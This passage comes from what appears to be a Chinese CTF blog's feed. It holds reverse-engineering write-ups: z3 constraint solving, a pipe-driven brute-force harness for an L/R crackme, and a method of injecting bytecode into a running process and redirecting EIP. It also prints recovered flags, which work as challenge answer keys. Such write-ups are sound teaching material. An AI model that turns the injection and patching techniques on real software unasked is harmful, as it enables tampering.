class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>   )</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>   )</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>        )</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>  )</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>     )</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>  )</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>  )</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>   )</span><br><span class="line">s.check()</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure><p>z3.BitVecs为设置变量及其位数</p><p>这里有个点疑惑了我很久,明明算出来的结果是8位,为什么设置8位却不能得到正确答案呢?</p><p>在问过大师傅之后我才知道原来是因为在过程中溢出了,所以导致结果不对</p><p>所以这里设置的 <span style="color:red"><strong>位数不仅要考虑本来应该是多少位,还需要考虑运算过程中是否可能溢出,以及是否需要溢出</strong></span></p><p>举个例子,如果是tea,tea的每一步都需要溢出,所以只要设定结果的位数就行了(不过tea一般写c脚本解)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=z3.Solver()</span><br><span class="line">s.add(...)</span><br><span class="line">s.check()</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure><p>z3一般的用法就是这样啦</p><p>运行后的结果是这样的</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824333/0" alt=""></p><p>再把上面的过程逆解密一下就能够得到flag了</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824424/0" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a2 = <span class="number">24</span>;</span><br><span class="line"><span class="keyword">char</span> a13 = <span class="number">88</span>;</span><br><span class="line"><span class="keyword">char</span> a6 = <span class="number">43</span>;</span><br><span class="line"><span class="keyword">char</span> a9 = <span class="number">52</span>;</span><br><span class="line"><span class="keyword">char</span> a14 = <span class="number">33</span>;</span><br><span class="line"><span class="keyword">char</span> a5 = <span class="number">104</span>;</span><br><span class="line"><span class="keyword">char</span> a12 = <span class="number">74</span>;</span><br><span class="line"><span class="keyword">char</span> a7 = <span class="number">28</span>;</span><br><span class="line"><span class="keyword">char</span> a1 = <span class="number">119</span>;</span><br><span class="line"><span class="keyword">char</span> a10 = <span class="number">108</span>;</span><br><span class="line"><span class="keyword">char</span> a11 = <span class="number">88</span>;</span><br><span class="line"><span class="keyword">char</span> a8 = <span class="number">91</span>;</span><br><span class="line"><span class="keyword">char</span> a4 = <span class="number">7</span>;</span><br><span class="line"><span class="keyword">char</span> a3 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">char</span> code[<span class="number">15</span>]=&#123;&#125;;</span><br><span class="line">code[<span class="number">2</span>]  = a1 ;</span><br><span class="line">    code[<span class="number">1</span>]  = a2 ;</span><br><span class="line">    code[<span class="number">0</span>]  = a3 ;</span><br><span class="line">    code[<span class="number">3</span>]  = a4 ;</span><br><span class="line">    code[<span class="number">4</span>]  = a5 ;</span><br><span class="line">    code[<span class="number">5</span>]  = a6 ;</span><br><span class="line">    code[<span class="number">6</span>]  = a7 ;</span><br><span class="line">    code[<span class="number">7</span>]  = a8 ;</span><br><span class="line">    code[<span class="number">9</span>]  = a9 ;</span><br><span class="line">    code[<span class="number">8</span>]  = a10;</span><br><span class="line">    code[<span class="number">10</span>] = a11;</span><br><span class="line">    code[<span class="number">11</span>] = a12;</span><br><span class="line">    code[<span class="number">12</span>] = a13;</span><br><span class="line">    code[<span class="number">13</span>] = a14;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">12</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    code[i]^=code[i+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://inews.gtimg.com/newsapp_ls/0/13030824497/0" alt=""></p><blockquote><p>flag{58964088b637e50d3a22b9510c1d1ef8}</p></blockquote>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2021/01/12/%E4%B8%80%E9%A2%98%E6%90%9E%E5%AE%9Aexe%E5%88%B0py%E5%8F%8Az3%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/#disqus_thread</comments>
    </item>
    
    <item>
      <title>一道预期解是爆破的题</title>
      <link>https://usher2008.github.io/2020/10/10/%E4%B8%80%E9%81%93%E9%A2%84%E6%9C%9F%E8%A7%A3%E6%98%AF%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/</link>
      <guid>https://usher2008.github.io/2020/10/10/%E4%B8%80%E9%81%93%E9%A2%84%E6%9C%9F%E8%A7%A3%E6%98%AF%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/</guid>
      <pubDate>Sat, 10 Oct 2020 07:29:33 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
这道题来自西湖论剑,关键代码是splay平衡树,俺不会
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>这道题来自西湖论剑,关键代码是splay平衡树,俺不会<a id="more"></a></blockquote><p><img src="http://inews.gtimg.com/newsapp_ls/0/12579783186/0" alt="image-20201008213916560"></p><p>从栈里可以看见格式是%25s</p><p>随便输入之后看ret返回之后的代码</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12579783209/0" alt="image-20201008214053666"></p><p>外层逻辑很清晰</p><p>只要经过<code>4022B7 call 004020C2</code>之后 <code>al!=0</code>就行了</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12579783242/0" alt="image-20201008214333209"></p><p>进入之后呢入眼就是一个strlen函数 想走到这里看看能不能知道所需求的长度</p><p>然而并不能 这里只是根据长度来进行下面的循环而已</p><p>再往下跟一下可以知道是将输入的每一位与0x4C和0x52相比 这两位分别是’L’和’R’</p><p>然后再往下走就直接跳到上面的循环并且计数器加一,说明输入只能是’L’和’R’</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12579783271/0" alt="image-20201008214737470"></p><p>粗略分析中间的代码,并且经过调试,可以看出是将每一位’L’或’R’传入call中,然后检查经过4个call之后的eax返回值,如果返回0会直接return</p><p>直接return肯定是不能的</p><p>但是分析中间各个的call,即使是用上了IDA的反编译来分析,也并没有理清程序的逻辑</p><p>后来想着 这个只需要输入’L’和’R’ 长度为25位</p><p>就尝试着在4个call下面那一句判断下断点,</p><p>每次多加一位,不是L就是R,都不是就回到上一位,</p><p>不过这种方法实在是难受</p><p>于是我把这4个地方都hook了一下</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12588056160/0" alt="image-20201009215121982"></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12588056204/0" alt="image-20201009215357994"></p><p>这样的结果是如果返回0就打印当前的flag索引值然后退出</p><p>然后用了管道进行输入输出交互 代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;                    <span class="comment">//定义句柄</span></span><br><span class="line">    SECURITY_ATTRIBUTES sa&#123; <span class="keyword">sizeof</span>(sa),<span class="literal">NULL</span>,<span class="literal">true</span> &#125;;                             <span class="comment">//初始化安全属性</span></span><br><span class="line">    CreatePipe(&amp;hReadPipe1, &amp;hWritePipe1, &amp;sa, <span class="number">0</span>);</span><br><span class="line">    CreatePipe(&amp;hReadPipe2, &amp;hWritePipe2, &amp;sa, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    STARTUPINFO si = &#123;&#125;;                                                        <span class="comment">//设置进程属性</span></span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line">    GetStartupInfoW(&amp;si);</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    si.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">    si.hStdInput   = hReadPipe2;;</span><br><span class="line">    si.hStdError   = si.hStdOutput = hWritePipe1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> flag;</span><br><span class="line">    <span class="keyword">char</span> cbBuf[<span class="number">4096</span>] = &#123;&#125;;                                                      <span class="comment">//读写缓存</span></span><br><span class="line">    PROCESS_INFORMATION pi = &#123;&#125;;                                                <span class="comment">//初始化进程信息结构体</span></span><br><span class="line">    DWORD dwRead, dwAvail, dwWrite;                                             <span class="comment">//用于储存所读写的字节个数</span></span><br><span class="line">    WCHAR pCommandLine[] = <span class="string">L"C:\\Users\\Administrator\\Desktop\\Cellular_patch.exe"</span>; <span class="comment">//执行的命令行</span></span><br><span class="line">    <span class="keyword">while</span> (flag.length() != <span class="number">25</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> temp&#123;&#125;;</span><br><span class="line">        pi = &#123;&#125;;</span><br><span class="line">        flag.push_back(<span class="string">'R'</span>);</span><br><span class="line">                                                                                <span class="comment">//按命令行,被初始化的启动信息和置空的进程信息创建一个进程</span></span><br><span class="line">        CreateProcess(<span class="literal">NULL</span>, pCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">        flag.push_back(<span class="string">'\r'</span>); flag.push_back(<span class="string">'\n'</span>);                             <span class="comment">//用于回车提交flag</span></span><br><span class="line"></span><br><span class="line">        WriteFile(hWritePipe2, flag.c_str(), flag.length() + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>);</span><br><span class="line">        Sleep(<span class="number">10</span>);                                                              <span class="comment">//这里不睡会影响读取结果</span></span><br><span class="line">                                                                                <span class="comment">//但是不知道是为什么</span></span><br><span class="line">        flag.pop_back(); flag.pop_back();</span><br><span class="line"></span><br><span class="line">        dwRead = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (PeekNamedPipe(hReadPipe1, cbBuf, BUFSIZE, &amp;dwRead, &amp;dwAvail, <span class="number">0</span>) &amp;&amp; dwRead)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">//如果管子里有东西才读,因为这个题目有一些输入会使得程序崩溃,无法获取输出导致进程卡死,不得不加上</span></span><br><span class="line">            ReadFile(hReadPipe1, cbBuf, BUFSIZE, &amp;dwRead, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(cbBuf, <span class="string">"Path:%d"</span>, &amp;temp);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            temp = flag.length() - <span class="number">1</span>;                           <span class="comment">//最后输入的那一位有错误,而且这一位错误使得程序崩溃</span></span><br><span class="line"></span><br><span class="line">        CloseHandle(pi.hProcess);</span><br><span class="line">        CloseHandle(pi.hThread);</span><br><span class="line"></span><br><span class="line">                                            <span class="comment">//从读取的字节中取出错误</span></span><br><span class="line">        <span class="keyword">if</span> (temp)                                                               <span class="comment">//如果有错误处理错误</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res&#123; <span class="number">0</span> &#125;;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (flag[temp - res] != <span class="string">'L'</span>)                    <span class="comment">//初始是'R',如果不是'L',说明这一位已经改过了</span></span><br><span class="line">                &#123;                                               <span class="comment">//那么就看上一位,依次循环上去</span></span><br><span class="line">                    flag[temp - res] = <span class="string">'L'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (flag.length() == <span class="number">25</span>)                                           <span class="comment">//如果长度为25而且没有错误!flag出!</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"flag&#123;md5(%s)&#125;"</span>, flag.c_str());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hReadPipe1);</span><br><span class="line">    CloseHandle(hWritePipe1);</span><br><span class="line">    CloseHandle(hReadPipe2);</span><br><span class="line">    CloseHandle(hWritePipe2);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还要注意的是要把程序结束后system(“pause”)nop掉 不然看不见输出</p><p>运行得到最后的结果是</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12588056246/0" alt="image-20201009215907505"></p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12579783293/0" alt="image-20201008220021533"></p><p>不过这个题目的话 还有一个师傅的一个爆破思路 我觉得很有创造性,学到许多</p><p>所以也在这里写写</p><p>首先写了一个main函数,是他那个主函数的main函数</p><p>然后把输入改成了循环 从1位到25位RL的全排列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (__cdecl* PFNHONEYCOMB)(<span class="keyword">void</span>* thiz);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(__cdecl* PFNINCDEPT)</span><span class="params">(<span class="keyword">void</span>* thiz)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span><span class="params">(__cdecl* PFNCHECKFLAG)</span><span class="params">(<span class="keyword">void</span>* thiz, <span class="keyword">char</span>* szBuff)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PFNHONEYCOMB pfnHoneycomb = (PFNHONEYCOMB)<span class="number">0x402202</span>;</span><br><span class="line">    PFNINCDEPT   pfnIncDept   = (PFNINCDEPT)  <span class="number">0x4012F0</span>;</span><br><span class="line">    PFNCHECKFLAG pfnCheckFlag = (PFNCHECKFLAG)<span class="number">0x4020C2</span>;</span><br><span class="line">    <span class="keyword">char</span> szThiz[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> szFlag[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//位数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">25</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//i位数二进制数的范围  0 ~ (1 &lt;&lt; i)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">1</span> &lt;&lt; i); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//先全赋值成L</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;i; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                szFlag[k] = <span class="string">'L'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            szFlag[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">int</span> tmp = j;</span><br><span class="line">           <span class="keyword">int</span> <span class="built_in">bit</span> = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (tmp &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tmp % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    szFlag[<span class="built_in">bit</span>] = <span class="string">'R'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">bit</span>++;</span><br><span class="line">                tmp /= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//try</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; a : szThiz)</span><br><span class="line">            &#123;</span><br><span class="line">                a = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            pfnHoneycomb(szThiz);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt;= <span class="number">4</span>; ++x)</span><br><span class="line">            &#123;</span><br><span class="line">                pfnIncDept(szThiz);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//input...</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">bool</span> bResult = pfnCheckFlag(szThiz, szFlag);</span><br><span class="line">            <span class="keyword">if</span> (bResult)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">goto</span> LB_END;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//else</span></span><br><span class="line">            <span class="comment">//&#123;</span></span><br><span class="line">            <span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf("%s\r\n", szFlag);</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//system("pause");</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">LB_END:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\r\n"</span>, szFlag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在反汇编软件中 复制这个程序的main函数的字节码</p><p>再在进入Cellular的主函数后 分配一段空白内存</p><p>在空白内存中粘贴字节码 然后修改EIP到这个地方 于是这个程序就会执行上面的代码了</p><p>于是这个程序就自己问自己这些flag是不是对的</p><p>是就输出flag</p><p>还要注意的是printf的地方要改一下 连带””%s\r\n”也要在后面加一下</p><p>但是这个程序他本身是有问题的,用一些特定的输入会跑蹦这个代码</p><p>如果再把上面那个printf取消注释 就可以看到代码在这个地方出现了异常</p><p><img src="http://inews.gtimg.com/newsapp_ls/0/12588056323/0" alt="image-20201010144147567"></p><p>这如果要解决还要去修复他原来的程序,实在麻烦就没有继续往下做了</p><p>但是这个思路确实是强啊</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/10/10/%E4%B8%80%E9%81%93%E9%A2%84%E6%9C%9F%E8%A7%A3%E6%98%AF%E7%88%86%E7%A0%B4%E7%9A%84%E9%A2%98/#disqus_thread</comments>
    </item>
    
    <item>
      <title>36D杯</title>
      <link>https://usher2008.github.io/2020/05/04/36D%E6%9D%AF/</link>
      <guid>https://usher2008.github.io/2020/05/04/36D%E6%9D%AF/</guid>
      <pubDate>Mon, 04 May 2020 15:41:58 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
开始：2020/4/30 20:00 结束：2020/5/4 20:00
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>开始：2020/4/30 20:00 结束：2020/5/4 20:00<a id="more"></a></blockquote><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>F5出来的关键代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v8 = getchar_0();</span><br><span class="line">  v6 |= v8 ^ i ^ (i + (i ^ *(&amp;v9 + (<span class="keyword">int</span>)i)));</span><br><span class="line">  v4 = i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v8 &amp;&amp; v8 != <span class="number">10</span> &amp;&amp; v8 != <span class="number">-1</span> );</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  sub_400828(aFailed, <span class="number">0L</span>L, v3, v4);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  sub_400828(aCorrect, <span class="number">0L</span>L, v3, v4);</span><br></pre></td></tr></table></figure><p>开始没看明白,后来看到v6=0才正确就晓得了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span 